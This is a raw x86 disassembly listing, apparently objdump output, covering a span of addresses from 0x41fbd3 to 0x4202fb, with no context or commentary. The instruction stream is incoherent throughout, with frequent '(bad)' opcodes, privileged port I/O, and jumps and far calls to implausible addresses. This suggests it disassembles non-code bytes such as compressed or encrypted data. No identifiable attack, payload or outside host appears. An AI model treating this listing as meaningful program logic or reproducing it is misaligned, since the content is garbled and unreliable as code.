  41fbd3:	mov    esi,DWORD PTR [eax-0x3467519f]
  41fbd9:	dec    esp
  41fbda:	inc    esp
  41fbdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fbdc:	and    ecx,ecx
  41fbde:	mov    edx,0xf6651590
  41fbe3:	stos   DWORD PTR es:[edi],eax
  41fbe4:	adc    eax,0x3260ad4a
  41fbe9:	and    DWORD PTR [eax+ebx*4+0x409ca935],ebp
  41fbf0:	pop    ds
  41fbf1:	push   cs
  41fbf2:	sahf   
  41fbf3:	inc    edx
  41fbf4:	mov    edx,0x71d3fa2f
  41fbf9:	cli    
  41fbfa:	jg     0x41fc6e
  41fbfc:	lea    edi,[ebp+0x39]
  41fbff:	aaa    
  41fc00:	cmp    eax,0xc1b37cf0
  41fc05:	dec    esi
  41fc06:	shl    DWORD PTR [edi-0x21],0x4c
  41fc0a:	outs   dx,DWORD PTR ds:[esi]
  41fc0b:	jbe    0x41fb99
  41fc0d:	ins    BYTE PTR es:[edi],dx
  41fc0e:	xchg   DWORD PTR [ebx],ebp
  41fc10:	iret   
  41fc11:	(bad)  
  41fc12:	push   edi
  41fc13:	aas    
  41fc14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc15:	mov    esi,0x591705eb
  41fc1a:	adc    DWORD PTR [ecx-0x28],eax
  41fc1d:	dec    ecx
  41fc1e:	mov    esi,0xfb34a60b
  41fc23:	rcl    BYTE PTR [ecx],1
  41fc25:	cwde   
  41fc26:	adc    DWORD PTR [esi+0x66],edx
  41fc29:	and    al,0xd3
  41fc2b:	pop    edx
  41fc2c:	ror    BYTE PTR [ecx],1
  41fc2e:	cmp    edx,edx
  41fc30:	ins    BYTE PTR es:[edi],dx
  41fc31:	popf   
  41fc32:	inc    eax
  41fc33:	adc    al,0x6
  41fc35:	or     eax,0xf8585e78
  41fc3a:	cs adc ah,dh
  41fc3d:	jge    0x41fc5d
  41fc3f:	dec    esp
  41fc40:	jmp    0x41fc7a
  41fc42:	pop    es
  41fc43:	push   cs
  41fc44:	retf   
  41fc45:	cmp    eax,0x5de07ba5
  41fc4a:	jecxz  0x41fc65
  41fc4c:	fwait
  41fc4d:	push   eax
  41fc4e:	xor    eax,0x4a02af4c
  41fc53:	push   ds
  41fc54:	push   ds
  41fc55:	ret    0x6a9d
  41fc58:	loope  0x41fc81
  41fc5a:	mov    WORD PTR [ebx],cs
  41fc5c:	mov    dh,BYTE PTR [esi+0x3cfe9a8f]
  41fc62:	add    BYTE PTR [eax-0x71014423],0x9d
  41fc69:	xor    BYTE PTR ss:[edi-0x7d],dl
  41fc6d:	pushf  
  41fc6e:	lock xchg edi,eax
  41fc70:	cli    
  41fc71:	mov    edx,0x9211368d
  41fc76:	cwde   
  41fc77:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc79:	popf   
  41fc7a:	cmp    edx,DWORD PTR [ecx-0x3e]
  41fc7d:	xchg   ebx,eax
  41fc7e:	imul   esp,DWORD PTR [edx+0x3983a64],0xffffff8d
  41fc85:	inc    esi
  41fc86:	xor    eax,0x3207477a
  41fc8b:	rcr    ebp,0xc3
  41fc8e:	push   ecx
  41fc8f:	add    DWORD PTR [esi],esi
  41fc91:	or     dl,BYTE PTR [eax-0xa7ceecb]
  41fc97:	iret   
  41fc98:	imul   edx
  41fc9a:	sti    
  41fc9b:	jne    0x41fc6b
  41fc9d:	scas   al,BYTE PTR es:[edi]
  41fc9e:	lds    ebx,FWORD PTR [ebx-0x2655b034]
  41fca4:	clc    
  41fca5:	fidivr DWORD PTR [ebx]
  41fca7:	adc    al,0xcd
  41fca9:	mov    ah,0xdf
  41fcab:	dec    edx
  41fcac:	and    eax,0x1bf11e46
  41fcb1:	popa   
  41fcb2:	adc    al,0x32
  41fcb4:	adc    BYTE PTR [edx-0x6e4bdd1f],bh
  41fcba:	push   cs
  41fcbb:	and    dh,BYTE PTR [ebp+0x3c]
  41fcbe:	repz hlt 
  41fcc0:	call   0x84b63fca
  41fcc5:	jp     0x41fcfa
  41fcc7:	(bad)  
  41fcc8:	cdq    
  41fcc9:	push   ax
  41fccb:	call   0x20104b9c
  41fcd0:	pop    esi
  41fcd1:	mov    dh,0x20
  41fcd3:	pop    ds
  41fcd4:	inc    edi
  41fcd5:	(bad)  
  41fcd6:	cs cs pop ecx
  41fcd9:	addr16 mov dh,0x3f
  41fcdc:	dec    esp
  41fcdd:	(bad)  
  41fcde:	mov    bh,0x42
  41fce0:	and    esp,ebp
  41fce2:	adc    BYTE PTR ds:0xe7d93a03,bh
  41fce8:	add    BYTE PTR [ecx-0x32],dl
  41fceb:	out    0xbb,eax
  41fced:	and    bh,BYTE PTR [edi]
  41fcef:	out    dx,eax
  41fcf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fcf2:	ror    DWORD PTR [eax+0x5c],1
  41fcf5:	neg    DWORD PTR [edi-0x4436477f]
  41fcfb:	ins    BYTE PTR es:[edi],dx
  41fcfc:	fisttp DWORD PTR [ecx+0x4946f3d8]
  41fd02:	lods   al,BYTE PTR ds:[esi]
  41fd03:	into   
  41fd04:	into   
  41fd05:	(bad)  
  41fd07:	das    
  41fd08:	call   0x635bec67
  41fd0d:	sti    
  41fd0e:	mov    cl,0x68
  41fd10:	push   esp
  41fd11:	xor    eax,DWORD PTR [ecx+0x6e]
  41fd14:	inc    ebp
  41fd15:	out    0xc1,al
  41fd17:	and    al,0x36
  41fd19:	mov    ch,0x6e
  41fd1b:	xchg   edx,eax
  41fd1c:	pop    edx
  41fd1d:	(bad)  
  41fd1e:	xor    al,0x15
  41fd20:	adc    BYTE PTR [edx+edx*8+0x3b],dh
  41fd24:	xchg   ebp,eax
  41fd25:	fnstsw WORD PTR [ebx+0x45856dbd]
  41fd2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd2c:	mov    edx,0x3d6719bd
  41fd31:	jmp    0x41fda3
  41fd33:	cmp    bl,BYTE PTR [ebp-0x71]
  41fd36:	out    0x6f,eax
  41fd38:	enter  0xa568,0x40
  41fd3c:	hlt    
  41fd3d:	int    0xbf
  41fd3f:	xchg   esi,eax
  41fd40:	or     eax,0x40b43085
  41fd45:	mov    ds:0xea7749d4,eax
  41fd4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd4b:	das    
  41fd4c:	js     0x41fd5e
  41fd4e:	scas   al,BYTE PTR es:[edi]
  41fd4f:	cld    
  41fd50:	mov    ecx,0x668a8f44
  41fd55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd56:	clc    
  41fd57:	fcom   QWORD PTR [edx-0xc]
  41fd5a:	adc    DWORD PTR [ebp-0x319dd201],edi
  41fd60:	dec    esi
  41fd61:	jecxz  0x41fd58
  41fd63:	pop    edx
  41fd64:	mov    al,0x81
  41fd66:	scas   al,BYTE PTR es:[edi]
  41fd67:	pop    eax
  41fd68:	test   ecx,0xfee002f2
  41fd6e:	add    dh,BYTE PTR [edx-0x7c]
  41fd71:	pop    eax
  41fd72:	inc    esp
  41fd73:	dec    edi
  41fd74:	sbb    al,0xc1
  41fd76:	rcl    BYTE PTR [edx+0x69],0x84
  41fd7a:	mov    edx,0xe5fae693
  41fd7f:	cmc    
  41fd80:	pusha  
  41fd81:	inc    edx
  41fd82:	sub    al,0x2e
  41fd84:	pop    es
  41fd85:	mov    dh,0xc1
  41fd87:	pop    esp
  41fd88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd89:	repnz inc ebp
  41fd8b:	std    
  41fd8c:	leave  
  41fd8d:	add    ebx,DWORD PTR [esp+eax*1+0x4]
  41fd91:	(bad)  
  41fd92:	adc    esp,esp
  41fd94:	fidivr DWORD PTR [ebp-0x2f35ae46]
  41fd9a:	or     BYTE PTR [edx+0x5f],al
  41fd9d:	cld    
  41fd9e:	dec    ebx
  41fd9f:	les    ebp,FWORD PTR [eax+0x70]
  41fda2:	loop   0x41fddf
  41fda4:	inc    ebx
  41fda5:	bound  ecx,QWORD PTR [ecx]
  41fda7:	mov    cs,WORD PTR ds:0x5d773fda
  41fdad:	cwde   
  41fdae:	int3   
  41fdaf:	push   esp
  41fdb0:	inc    edx
  41fdb1:	or     ch,ch
  41fdb3:	imul   esi,DWORD PTR [ebx],0x64
  41fdb6:	enter  0xd214,0x82
  41fdba:	sar    ebx,cl
  41fdbc:	mov    ecx,0x28b8f73b
  41fdc1:	scas   al,BYTE PTR es:[edi]
  41fdc2:	mov    ds,WORD PTR [esi-0x1dab9b7e]
  41fdc8:	fwait
  41fdc9:	mov    edx,0x7bf66c64
  41fdce:	xor    eax,0x1675ca7
  41fdd3:	and    edi,DWORD PTR [eiz*1-0x5aa8a064]
  41fdda:	pop    edx
  41fddb:	add    DWORD PTR [edi+0x68dfc68b],ebp
  41fde1:	mov    esi,0x37fb6f5b
  41fde6:	scas   al,BYTE PTR es:[edi]
  41fde7:	mov    eax,DWORD PTR [edx+0x3bd62a7a]
  41fded:	jl     0x41fda4
  41fdef:	(bad)  
  41fdf0:	(bad)  
  41fdf1:	nop
  41fdf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fdf3:	jb     0x41fd7a
  41fdf5:	add    BYTE PTR [ebx+0x23],bh
  41fdf8:	je     0x41fda0
  41fdfa:	stc    
  41fdfb:	push   ebp
  41fdfc:	rol    DWORD PTR [edi-0x1f],0xf7
  41fe00:	mov    bl,0x4a
  41fe02:	icebp  
  41fe03:	or     DWORD PTR [ecx],ebp
  41fe05:	pop    ss
  41fe06:	mov    WORD PTR [esi+0x11],fs
  41fe09:	cmp    DWORD PTR [ebx],edx
  41fe0b:	out    0x33,al
  41fe0d:	dec    ecx
  41fe0e:	div    edx
  41fe10:	cmp    eax,0xebc914d4
  41fe15:	xor    DWORD PTR [ebp-0x565a91ec],esp
  41fe1b:	lods   al,BYTE PTR ds:[esi]
  41fe1c:	sub    edi,DWORD PTR [eax]
  41fe1e:	pop    eax
  41fe1f:	jno    0x41fda9
  41fe21:	add    DWORD PTR [edi-0x5c],edx
  41fe24:	sub    BYTE PTR [ebp+0x5bcaca2e],cl
  41fe2a:	outs   dx,BYTE PTR ds:[esi]
  41fe2b:	mov    esi,0x8e73c947
  41fe30:	push   edi
  41fe31:	in     al,dx
  41fe32:	jg     0x41fe18
  41fe34:	add    ecx,edi
  41fe36:	mov    ebx,0xe3dcd1fd
  41fe3b:	enter  0xe399,0x70
  41fe3f:	dec    ebp
  41fe40:	push   ecx
  41fe41:	std    
  41fe42:	xor    cl,BYTE PTR [ecx+ebx*8-0x2b0ed905]
  41fe49:	pop    ebp
  41fe4a:	adc    al,BYTE PTR [edx-0x232ffbc2]
  41fe50:	out    dx,eax
  41fe51:	shr    ebx,cl
  41fe53:	jmp    0x9669081c
  41fe58:	adc    cl,BYTE PTR [esp+esi*4-0x38]
  41fe5c:	mov    ecx,ebp
  41fe5e:	sahf   
  41fe5f:	lahf   
  41fe60:	jne    0x41fea6
  41fe62:	push   0xffffffbe
  41fe64:	pop    ss
  41fe65:	xor    bh,BYTE PTR [ebx]
  41fe67:	push   ebx
  41fe68:	push   esi
  41fe69:	adc    DWORD PTR [ebx-0x70],0x263734e5
  41fe70:	cmp    ebp,DWORD PTR [eax-0x49]
  41fe73:	mov    eax,0x41bd9cd6
  41fe78:	ss dec edx
  41fe7a:	sub    DWORD PTR [ebx],ebp
  41fe7c:	push   eax
  41fe7d:	push   es
  41fe7e:	jb     0x41fe40
  41fe80:	lea    ebp,[esi]
  41fe82:	inc    esi
  41fe83:	inc    ebx
  41fe84:	lods   eax,DWORD PTR ds:[esi]
  41fe85:	or     eax,ebx
  41fe87:	mov    DWORD PTR [eax-0x56],esi
  41fe8a:	adc    edi,DWORD PTR [ebp+ebp*2+0x38]
  41fe8e:	adc    eax,0xa616556b
  41fe93:	mov    ah,0xc5
  41fe95:	aaa    
  41fe96:	ret    0xabba
  41fe99:	hlt    
  41fe9a:	aam    0x69
  41fe9c:	dec    ecx
  41fe9d:	mov    bh,0x64
  41fe9f:	gs pop ds
  41fea1:	test   esi,esp
  41fea3:	retf   0xbe34
  41fea6:	mov    bh,0xfa
  41fea8:	loopne 0x41fe48
  41feaa:	enter  0xc1a5,0x7e
  41feae:	loopne 0x41fe8a
  41feb0:	push   cs
  41feb1:	js     0x41ff03
  41feb3:	jo     0x41fe5e
  41feb5:	in     al,dx
  41feb6:	jmp    0x41fe66
  41feb8:	int    0x30
  41feba:	xchg   edx,eax
  41febb:	fdivr  DWORD PTR [esi]
  41febd:	push   cs
  41febe:	ficom  DWORD PTR [ebx]
  41fec0:	in     eax,0xaa
  41fec2:	test   eax,0x831da87c
  41fec7:	leave  
  41fec8:	not    BYTE PTR [eax-0x52d76264]
  41fece:	add    edx,edx
  41fed0:	jne    0x41ff3e
  41fed2:	and    al,0x75
  41fed4:	cmp    DWORD PTR [ecx],0x1af1ecb6
  41feda:	mov    bl,0xc7
  41fedc:	fnstsw WORD PTR [edi+eiz*1]
  41fedf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fee0:	pop    ebp
  41fee1:	cwde   
  41fee2:	xor    al,0xb5
  41fee4:	cmp    al,0xac
  41fee6:	mov    esp,0x522abdca
  41feeb:	mov    ss,WORD PTR [esi]
  41feed:	or     al,0x7d
  41feef:	mov    esp,0xd5b6bb5c
  41fef4:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41fef6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fef7:	(bad)  
  41fef9:	(bad)  
  41fefa:	sbb    cl,bh
  41fefc:	repnz fidivr DWORD PTR [edi+edx*1-0x4a]
  41ff01:	in     al,dx
  41ff02:	nop
  41ff03:	sti    
  41ff04:	imul   ebx,DWORD PTR [ebp-0x24],0x9
  41ff08:	sti    
  41ff09:	daa    
  41ff0a:	inc    esp
  41ff0b:	xchg   ebp,eax
  41ff0c:	xchg   dh,cl
  41ff0e:	mov    esi,0x4d242729
  41ff13:	and    bh,BYTE PTR [eax]
  41ff15:	cmp    ebx,DWORD PTR [edx+0x7cea9bb5]
  41ff1b:	or     DWORD PTR [ebp+edx*2+0x51],esp
  41ff1f:	out    0xd4,al
  41ff21:	or     edx,DWORD PTR [ecx]
  41ff23:	nop
  41ff24:	sbb    DWORD PTR [eax],0xffffffa0
  41ff27:	repz dec sp
  41ff2a:	mov    cl,0xe2
  41ff2c:	jmp    0x41fec9
  41ff2e:	div    BYTE PTR [ebp+0x419241e5]
  41ff34:	ja     0x41ff6b
  41ff36:	inc    eax
  41ff37:	stc    
  41ff38:	pop    ecx
  41ff39:	dec    edi
  41ff3a:	lods   al,BYTE PTR ds:[esi]
  41ff3b:	xor    esi,DWORD PTR [esi]
  41ff3d:	xchg   BYTE PTR [ebp-0x51],bh
  41ff40:	inc    esi
  41ff41:	ret    
  41ff42:	cdq    
  41ff43:	aaa    
  41ff44:	xchg   ebp,eax
  41ff45:	ficom  DWORD PTR [edi+0xc8c406e]
  41ff4b:	ins    DWORD PTR es:[edi],dx
  41ff4c:	popf   
  41ff4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff4e:	packssdw mm7,QWORD PTR [ecx+0x12]
  41ff52:	ror    BYTE PTR [esi+0x25],cl
  41ff55:	aad    0xfc
  41ff57:	in     al,0x7
  41ff59:	jo     0x41ff6f
  41ff5b:	push   ss
  41ff5c:	call   0x4ce30820
  41ff61:	cmp    ch,dh
  41ff63:	in     eax,0x39
  41ff65:	lods   al,BYTE PTR ds:[esi]
  41ff66:	jl     0x41ffd8
  41ff68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff69:	(bad)  
  41ff6a:	or     BYTE PTR [edi-0x7bba0b52],cl
  41ff70:	push   esi
  41ff71:	ret    
  41ff72:	xchg   ebp,eax
  41ff73:	repz pop ebx
  41ff75:	inc    ebp
  41ff76:	inc    edx
  41ff77:	or     bh,BYTE PTR [edi+0x23]
  41ff7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff7b:	out    dx,al
  41ff7c:	sti    
  41ff7d:	cmc    
  41ff7e:	xchg   ebx,eax
  41ff7f:	add    eax,0xe00a4c2d
  41ff84:	sti    
  41ff85:	cdq    
  41ff86:	or     eax,0x2f2d2897
  41ff8b:	call   0xa80e640
  41ff90:	push   cs
  41ff91:	add    esi,DWORD PTR [ecx+0x54499dcb]
  41ff97:	jno    0x41ff43
  41ff99:	jmp    0x212a:0x640ec959
  41ffa0:	sub    eax,ebx
  41ffa2:	scas   eax,DWORD PTR es:[edi]
  41ffa3:	fs jmp 0x41ff37
  41ffa6:	jbe    0xe7179d4f
  41ffac:	pop    edi
  41ffad:	ret    0xddd3
  41ffb0:	scas   al,BYTE PTR es:[edi]
  41ffb1:	test   DWORD PTR [esi],ebx
  41ffb3:	xchg   edx,eax
  41ffb5:	xlat   BYTE PTR ds:[ebx]
  41ffb6:	xchg   edi,eax
  41ffb7:	adc    eax,0x36
  41ffba:	pop    ss
  41ffbb:	int3   
  41ffbc:	mov    eax,ds:0x5766c0df
  41ffc1:	jge    0x41ff84
  41ffc3:	cmc    
  41ffc4:	dec    edi
  41ffc5:	arpl   WORD PTR [ebp-0x146ece57],bx
  41ffcb:	dec    ebx
  41ffcc:	fyl2x  
  41ffce:	mov    dh,0xa2
  41ffd0:	sub    al,0x5a
  41ffd2:	mov    dl,0x80
  41ffd4:	xlat   BYTE PTR ds:[ebx]
  41ffd5:	xor    cl,dl
  41ffd7:	fisub  WORD PTR [edx-0x55146a60]
  41ffdd:	mov    ebx,0x5675316e
  41ffe2:	and    DWORD PTR [ebp-0x31],edx
  41ffe5:	xor    BYTE PTR [eax+0x21a92ee3],ch
  41ffeb:	and    dh,bh
  41ffed:	inc    ebp
  41ffee:	std    
  41ffef:	xchg   BYTE PTR [ebx],dh
  41fff1:	pop    esi
  41fff2:	inc    edx
  41fff3:	sahf   
  41fff4:	popf   
  41fff5:	xor    eax,0x1b7c728c
  41fffa:	jo     0x420004
  41fffc:	dec    edx
  41fffd:	ficomp DWORD PTR [edx-0x9]
  420000:	in     eax,0x8f
  420002:	mov    DWORD PTR [ebx-0x76],esp
  420005:	les    ebx,FWORD PTR [eax+0x3c4db9f1]
  42000b:	mov    ch,0x63
  42000d:	daa    
  42000e:	or     ah,dh
  420010:	pop    esp
  420011:	jmp    0x42008f
  420013:	sti    
  420014:	sub    BYTE PTR [edx],cl
  420016:	cli    
  420017:	inc    esi
  420018:	jns    0x420009
  42001a:	mov    ecx,0x26aade4
  42001f:	and    edi,DWORD PTR [ecx+0x6c]
  420022:	xlat   BYTE PTR ds:[ebx]
  420023:	cwde   
  420024:	jge    0x42004d
  420026:	jno    0x420004
  420028:	imul   ebx,DWORD PTR [edi+0x44],0xffffffa1
  42002c:	adc    ebp,DWORD PTR [eax-0x10f70b80]
  420032:	cld    
  420033:	(bad)  
  420035:	mov    esp,0x8d2f044b
  42003a:	(bad)  [edx-0x1c067ee6]
  420040:	xchg   ebx,eax
  420041:	jp     0x420099
  420043:	xchg   edi,eax
  420044:	(bad)  
  420045:	repnz int3 
  420047:	and    al,BYTE PTR [ecx]
  420049:	ins    DWORD PTR es:[edi],dx
  42004a:	or     ch,bh
  42004c:	push   ds
  42004d:	pop    esp
  42004e:	pusha  
  42004f:	call   0x871e287c
  420054:	sub    DWORD PTR [eax+0x9],edx
  420057:	adc    eax,ebx
  420059:	int    0xb2
  42005b:	mov    edi,0xae1c6b4f
  420060:	int    0xab
  420062:	xchg   DWORD PTR [edx+0x2a],ebx
  420065:	xchg   ebx,eax
  420066:	pushf  
  420067:	mov    ?,WORD PTR [eax]
  420069:	mov    BYTE PTR [ebp+0x687002e0],bl
  42006f:	int    0x4e
  420071:	stos   BYTE PTR es:[edi],al
  420072:	mov    eax,ds:0x5baee2df
  420077:	into   
  420078:	ror    BYTE PTR [edx+0x47a911ba],1
  42007e:	xchg   edx,eax
  42007f:	outs   dx,BYTE PTR ds:[esi]
  420080:	dec    eax
  420081:	mov    edi,0x404a0ddf
  420086:	pop    es
  420087:	stos   DWORD PTR es:[edi],eax
  420088:	fwait
  420089:	cld    
  42008a:	mov    cs,WORD PTR ds:0xa7dadf41
  420090:	xchg   BYTE PTR [ebp-0x3b],bl
  420093:	mov    esi,0x84b93245
  420098:	fiadd  DWORD PTR [edx]
  42009a:	pop    ecx
  42009b:	fld    DWORD PTR [ecx+0x3d]
  42009e:	fs mov edi,0xe5770f29
  4200a4:	dec    edi
  4200a5:	retf   0x96d6
  4200a8:	or     bl,BYTE PTR [ecx+0x5]
  4200ab:	or     bl,BYTE PTR [ecx+esi*2]
  4200ae:	int3   
  4200af:	sti    
  4200b0:	push   0x331d243a
  4200b5:	mov    ds:0xa5b8a518,al
  4200ba:	imul   BYTE PTR [ebx]
  4200bc:	xchg   esi,eax
  4200bd:	int3   
  4200be:	or     edi,DWORD PTR ds:0xcc02527c
  4200c4:	inc    ebp
  4200c5:	popa   
  4200c6:	in     eax,dx
  4200c7:	ficomp DWORD PTR [ebp+0x2]
  4200ca:	cs inc ecx
  4200cc:	sbb    al,0xfc
  4200ce:	mov    ?,WORD PTR [ebp+0x7281a8e1]
  4200d4:	push   ecx
  4200d5:	mov    edx,0x97c723d0
  4200da:	clc    
  4200db:	ins    BYTE PTR es:[edi],dx
  4200dc:	data16 fwait
  4200de:	inc    edx
  4200df:	and    DWORD PTR [esp+ebp*8],0x2863acf3
  4200e6:	dec    ebp
  4200e7:	jecxz  0x420151
  4200e9:	pop    ds
  4200ea:	mov    ebx,0x502e93ad
  4200ef:	stos   DWORD PTR es:[edi],eax
  4200f0:	stos   DWORD PTR es:[edi],eax
  4200f1:	cmp    esi,esi
  4200f3:	push   eax
  4200f4:	jb     0x4200c9
  4200f6:	jg     0x4200e6
  4200f8:	or     edi,ebp
  4200fa:	mov    ch,0xc0
  4200fc:	pusha  
  4200fd:	jo     0x4200bc
  4200ff:	push   es
  420100:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420101:	repz retf 
  420103:	lahf   
  420104:	sahf   
  420105:	adc    esi,DWORD PTR [edx]
  420107:	ret    0x82a
  42010a:	or     DWORD PTR [ebx+ecx*2+0x4a8aa2d9],ebp
  420111:	fimul  DWORD PTR [edi+0x4c]
  420114:	pushf  
  420115:	cmp    al,0xed
  420117:	nop
  420118:	mov    dh,0xe1
  42011a:	ret    
  42011b:	clc    
  42011c:	gs scas eax,DWORD PTR es:[edi]
  42011e:	outs   dx,BYTE PTR ds:[esi]
  42011f:	cmp    DWORD PTR [edx-0xf],ecx
  420122:	jbe    0x420187
  420124:	sub    eax,0x7b8bc328
  420129:	mov    ah,0xfe
  42012b:	adc    dh,dh
  42012d:	push   ebx
  42012e:	xor    al,0x9c
  420130:	fcmovb st,st(1)
  420132:	in     eax,0x27
  420134:	or     esi,DWORD PTR [ebx]
  420136:	add    BYTE PTR [ebx-0x7b9bd89],ch
  42013c:	loop   0x42013e
  42013e:	out    0x55,al
  420140:	out    0x68,al
  420142:	data16 fst QWORD PTR cs:[ebx-0x26]
  420147:	xor    DWORD PTR [ebp+0x50cb59dc],0x4bceac11
  420151:	(bad)  
  420152:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420153:	retf   0x899
  420156:	ret    0x2475
  420159:	pop    ecx
  42015a:	jb     0x4201be
  42015c:	(bad)  
  42015d:	out    0x59,al
  42015f:	xor    eax,0x4e018d3c
  420164:	adc    bl,BYTE PTR [eax]
  420166:	jnp    0x42012e
  420168:	(bad)  
  42016a:	push   ds
  42016b:	jae    0x420139
  42016d:	shl    DWORD PTR [ebx],0x0
  420170:	sbb    al,0x5d
  420172:	out    0x2b,al
  420174:	push   ecx
  420175:	push   cs
  420176:	push   ss
  420177:	push   eax
  420178:	icebp  
  420179:	hlt    
  42017a:	test   eax,0xe97257c1
  42017f:	jmp    0xa425:0xb740
  420185:	or     bl,dl
  420187:	inc    ebx
  420188:	cld    
  420189:	jp     0x420122
  42018b:	adc    al,0xb1
  42018d:	je     0x4201a0
  42018f:	adc    eax,0xba437307
  420194:	cmp    eax,0x6250bc7a
  420199:	out    0x45,eax
  42019b:	shr    DWORD PTR [ecx-0x285bb303],cl
  4201a1:	stc    
  4201a2:	adc    BYTE PTR [edi],al
  4201a4:	and    al,BYTE PTR [eax+0x178beb38]
  4201aa:	lods   al,BYTE PTR ds:[esi]
  4201ab:	iret   
  4201ac:	lods   eax,DWORD PTR ds:[esi]
  4201ad:	push   ebp
  4201ae:	adc    al,0x8e
  4201b0:	pop    esp
  4201b1:	stc    
  4201b2:	push   ds
  4201b3:	lds    eax,FWORD PTR [eax-0x13]
  4201b6:	test   eax,0x4d3ffce2
  4201bb:	sbb    bh,cl
  4201bd:	mov    edi,0xfd577b3a
  4201c2:	push   cs
  4201c3:	xor    eax,0xe656e119
  4201c8:	sub    DWORD PTR [edx],edx
  4201ca:	bound  ebp,QWORD PTR [esi-0x473a6ef9]
  4201d0:	add    eax,0xe80429c1
  4201d5:	ficom  DWORD PTR [esi]
  4201d7:	rcl    DWORD PTR [eax],0xc3
  4201da:	dec    edx
  4201db:	out    dx,eax
  4201dc:	dec    ebp
  4201dd:	or     eax,0x648ed5ec
  4201e2:	dec    edi
  4201e3:	jp     0x420213
  4201e5:	xchg   esi,eax
  4201e6:	pushf  
  4201e7:	mov    WORD PTR [edx-0x1],es
  4201ea:	jmp    0x42020e
  4201ec:	jecxz  0x4201dd
  4201ee:	jge    0x42022d
  4201f0:	imul   eax,DWORD PTR [edi+0x2813cbef],0xab56fc41
  4201fa:	cmp    dh,BYTE PTR [eax-0x47df8975]
  420200:	(bad)  
  420201:	loopne 0x420210
  420203:	lods   al,BYTE PTR ds:[esi]
  420204:	dec    esi
  420205:	jae    0x420246
  420207:	ret    0x201c
  42020a:	or     bl,al
  42020c:	or     ebx,ecx
  42020e:	data16 (bad) 
  420210:	fist   WORD PTR [ebx]
  420212:	daa    
  420213:	out    0x64,al
  420215:	aaa    
  420216:	adc    esp,DWORD PTR [ebp-0x55]
  420219:	mov    esp,0x1af2e34a
  42021e:	adc    ecx,ecx
  420220:	ror    esi,cl
  420222:	pop    ebp
  420223:	das    
  420224:	mov    bl,0xa7
  420226:	sbb    BYTE PTR [ebx-0x1a6d0041],0x11
  42022d:	mov    eax,ds:0x24632028
  420232:	data16 loope 0x4202af
  420235:	lea    edx,[eax+0x166fbde]
  42023b:	lock sbb al,0xf2
  42023e:	dec    edx
  42023f:	int3   
  420240:	xchg   ebp,eax
  420241:	xchg   edx,eax
  420242:	xchg   BYTE PTR [esi],dl
  420244:	fwait
  420245:	mov    al,ds:0x680cfe5
  42024a:	fnstenv [eax-0x2eaf1d5a]
  420250:	lods   eax,DWORD PTR ds:[esi]
  420251:	stos   BYTE PTR es:[edi],al
  420252:	(bad)  
  420253:	in     eax,dx
  420254:	inc    BYTE PTR [esi+ebx*1]
  420257:	sub    dh,BYTE PTR [ebp-0x12]
  42025a:	push   edx
  42025b:	push   eax
  42025c:	daa    
  42025d:	or     al,dh
  42025f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420260:	pop    eax
  420261:	out    dx,al
  420262:	adc    ch,BYTE PTR gs:0x7d5e5ec7
  420269:	aam    0xea
  42026b:	jge    0x4201fa
  42026d:	(bad)  
  42026e:	mov    edx,0xdd041980
  420273:	ret    
  420274:	dec    eax
  420275:	jg     0x42026d
  420277:	out    dx,eax
  420278:	(bad)  
  420279:	lods   al,BYTE PTR ds:[esi]
  42027a:	sub    BYTE PTR [ecx-0x4680178c],bh
  420280:	mov    dh,0xa5
  420282:	cmp    ebp,DWORD PTR [edx]
  420284:	out    0xb3,al
  420286:	sar    BYTE PTR [edx+edi*2],cl
  420289:	test   dl,cl
  42028b:	inc    esp
  42028c:	int    0xb7
  42028e:	adc    al,BYTE PTR [edi-0x2]
  420291:	int3   
  420292:	shr    DWORD PTR [eax-0x2c],1
  420295:	xchg   BYTE PTR [ebx],cl
  420297:	sbb    BYTE PTR [ecx],ch
  420299:	retf   0x98f8
  42029c:	imul   esp,DWORD PTR [edi],0xffffffb3
  42029f:	cld    
  4202a0:	push   esi
  4202a1:	inc    eax
  4202a2:	cmc    
  4202a3:	or     ebp,DWORD PTR [ecx]
  4202a5:	call   0xe747:0xf340b955
  4202ac:	mov    bh,0xae
  4202ae:	adc    eax,DWORD PTR [ecx]
  4202b0:	pop    es
  4202b1:	outs   dx,DWORD PTR ds:[esi]
  4202b2:	push   eax
  4202b3:	std    
  4202b4:	icebp  
  4202b5:	pop    edx
  4202b6:	jmp    0x42023e
  4202b8:	cli    
  4202b9:	push   ss
  4202ba:	mov    esp,0xf38f9d2d
  4202bf:	adc    DWORD PTR [esi-0x272b3b5a],ebx
  4202c5:	lods   al,BYTE PTR ds:[esi]
  4202c6:	xlat   BYTE PTR ds:[ebx]
  4202c7:	sbb    eax,0xb3d57398
  4202cc:	repz test ebx,ebp
  4202cf:	jmp    0x7542:0x9d94e28e
  4202d6:	mov    bl,0x17
  4202d8:	fist   WORD PTR ds:0xe1309ebe
  4202de:	ins    DWORD PTR es:[edi],dx
  4202df:	shl    DWORD PTR [ebx+0x4f],1
  4202e2:	ins    DWORD PTR es:[edi],dx
  4202e3:	sub    ebp,esp
  4202e5:	retf   
  4202e6:	rol    eax,1
  4202e8:	leave  
  4202e9:	mov    esp,0xdb6d6c2d
  4202ee:	pushf  
  4202ef:	push   ecx
  4202f0:	jmp    0x8140:0x8cf3e86d
  4202f7:	pop    es
  4202f8:	lods   al,BYTE PTR ds:[esi]
  4202f9:	pop    ebx
  4202fa:	popf   
  4202fb:	add    edi,ebp
